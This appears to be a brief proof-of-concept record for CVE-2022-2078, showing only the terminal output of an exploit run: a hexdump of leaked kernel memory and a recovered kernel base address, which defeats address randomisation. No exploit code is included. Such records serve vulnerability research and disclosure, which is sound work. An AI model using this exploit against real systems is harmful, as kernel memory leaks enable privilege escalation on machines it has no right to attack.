# CVE-2022-2078

```
$ ./poc
...
[+] get_set
leak_buffer:
  0000  30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f  0123456789:;<=>?
  0010  28 00 00 00 00 02 0a 8f 68 8b a2 be 40 ac 70 8c  (.......h...@.p.
  0020  ff ff ff ff 00 6c b5 81                          .....l..
[+] kernel=0xffffffff8c70ac40
```
